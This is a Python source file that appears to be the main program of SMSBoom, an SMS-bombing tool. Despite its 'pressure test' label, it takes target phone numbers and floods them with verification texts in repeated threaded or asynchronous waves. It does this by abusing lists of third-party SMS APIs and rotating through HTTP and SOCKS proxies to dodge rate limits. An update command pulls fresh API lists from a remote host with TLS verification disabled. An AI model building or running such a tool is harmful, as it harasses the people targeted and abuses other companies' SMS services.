# encoding=utf8
# 短信测压主程序

from utils import default_header_user_agent
from utils.log import logger
from utils.models import API
from utils.req import reqFunc, reqFuncByProxy, runAsync
from concurrent.futures import ThreadPoolExecutor
from typing import List, Union
import asyncio
import json
import pathlib
import sys
import time
import click
import httpx

# current directory
path = pathlib.Path(__file__).parent


def load_proxies() -> list:
    """load proxies for files
    :return: proxies list
    """
    proxy_data = []
    try:
        proxy_path = pathlib.Path(path, 'http_proxy.txt')
        for line in open(proxy_path):
            le = line.replace("\r", "").replace("\n", "")
            if le == '':
                continue
            proxy_one = {
                'all://': 'http://' + le
            }
            proxy_data.append(proxy_one)
        proxy_path = pathlib.Path(path, 'socks4_proxy.txt')
        for line in open(proxy_path):
            le = line.replace("\r", "").replace("\n", "")
            if le == '':
                continue
            proxy_one = {
                'all://': 'socks4://' + le
            }
            proxy_data.append(proxy_one)
        proxy_path = pathlib.Path(path, 'socks5_proxy.txt')
        for line in open(proxy_path):
            le = line.replace("\r", "").replace("\n", "")
            if le == '':
                continue
            proxy_one = {
                'all://': 'socks5://' + le
            }
            proxy_data.append(proxy_one)
    except:
        logger.error("proxies 加载失败")
        return []
    logger.success(f"proxies 加载完成 接口数:{len(proxy_data)}")
    return proxy_data


def load_json() -> List[API]:
    """load json for api.json
    :return: api list
    """
    json_path = pathlib.Path(path, 'api.json')
    if not json_path.exists():
        logger.error("Json file not exists!")
        # return None
        raise ValueError

    with open(json_path.resolve(), mode="r", encoding="utf8") as j:
        try:
            datas = json.loads(j.read())
            APIs = [
                API(**data)
                for data in datas
            ]
            logger.success(f"api.json 加载完成 接口数:{len(APIs)}")
            return APIs
        except Exception as why:
            logger.error(f"Json file syntax error:{why}")
            # return None
            raise ValueError


def load_getapi() -> list:
    """load GETAPI
    :return:
    """
    json_path = pathlib.Path(path, 'GETAPI.json')
    if not json_path.exists():
        logger.error("GETAPI.json file not exists!")
        # return None
        raise ValueError

    with open(json_path.resolve(), mode="r", encoding="utf8") as j:
        try:
            datas = json.loads(j.read())
            logger.success(f"GETAPI加载完成,数目:{len(datas)}")
            return datas
        except Exception as why:
            logger.error(f"Json file syntax error:{why}")
            # return None
            raise ValueError


@click.command()
@click.option("--thread","--t","-t", help="线程数(默认64)", default=64)
@click.option("--phone", "-p","-P","--P","--p", help="手机号,可传入多个再使用-p传递", prompt=True, required=True, multiple=True)
@click.option('--frequency', "-f", default=1, help="执行次数(默认1次)", type=int)
@click.option('--interval', "-i", default=60, help="间隔时间(默认60s)", type=int)
@click.option('--enable_proxy', "-e", is_flag=True, help="开启代理(默认关闭)", type=bool)
def run(thread: int, phone: Union[str, tuple], frequency: int, interval: int, enable_proxy: bool = False):
    """传入线程数和手机号启动轰炸,支持多手机号"""
    logger.info(f"手机号:{phone}, 线程数:{thread}, 执行次数:{frequency}, 间隔时间:{interval}")
    with ThreadPoolExecutor(max_workers=thread) as pool:
        try:
            _api = load_json()
            _api_get = load_getapi()
            _proxies = load_proxies()
        except ValueError:
            logger.error("读取接口出错!正在重新下载接口数据!....")
            update()
            sys.exit(1)
        for i in range(1, frequency + 1):
            logger.success(f"第{i}波轰炸开始！")
            for proxy in _proxies:
                logger.success(f"第{i}波轰炸 - 当前正在使用代理：" +
                               proxy['all://'] + " 进行轰炸...") if enable_proxy else logger.success(f"第{i}波开始轰炸...")
                # 不可用的代理或API过多可能会影响轰炸效果
                for api in _api:
                    pool.submit(reqFuncByProxy, api, phone, proxy) if enable_proxy else pool.submit(reqFunc, api, phone)
                for api_get in _api_get:
                    pool.submit(reqFuncByProxy, api_get, phone, proxy) if enable_proxy else pool.submit(reqFunc, api_get, phone)
                logger.success(f"第{i}波轰炸提交结束！休息{interval}s.....")
                time.sleep(interval)


@click.option("--phone", "-p", help="手机号,可传入多个再使用-p传递", prompt=True, required=True, multiple=True)
@click.command()
def asyncRun(phone):
    """以最快的方式请求接口(真异步百万并发)"""
    _api = load_json()
    _api_get = load_getapi()

    apis = _api + _api_get

    loop = asyncio.get_event_loop()
    loop.run_until_complete(runAsync(apis, phone))


@click.option("--phone", "-p", help="手机号,可传入多个再使用-p传递", prompt=True, required=True, multiple=True)
@click.command()
def oneRun(phone):
    """单线程(测试使用)"""
    _api = load_json()
    _api_get = load_getapi()

    apis = _api + _api_get

    for api in apis:
        try:
            reqFunc(api, phone)
        except:
            pass


@click.command()
def update():
    """从 github 获取最新接口"""
    GETAPI_json_url = f"https://hk1.monika.love/AdminWhaleFall/SMSBoom/master/GETAPI.json"
    API_json_url = f"https://hk1.monika.love/AdminWhaleFall/SMSBoom/master/api.json"
    logger.info(f"正在从GitHub拉取最新接口!")
    try:
        with httpx.Client(verify=False, timeout=10) as client:
            # print(API_json_url)
            GETAPI_json = client.get(
                GETAPI_json_url, headers=default_header_user_agent()).content.decode(encoding="utf8")
            api_json = client.get(
                API_json_url, headers=default_header_user_agent()).content.decode(encoding="utf8")

    except Exception as why:
        logger.error(f"拉取更新失败:{why}请关闭所有代理软件多尝试几次!")
    else:
        with open(pathlib.Path(path, "GETAPI.json").absolute(), mode="w", encoding="utf8") as a:
            a.write(GETAPI_json)
        with open(pathlib.Path(path, "api.json").absolute(), mode="w", encoding="utf8") as a:
            a.write(api_json)
        logger.success(f"接口更新成功!")


@click.group()
def cli():
    pass


cli.add_command(run)
cli.add_command(update)
cli.add_command(asyncRun)
cli.add_command(oneRun)

if __name__ == "__main__":
    cli()
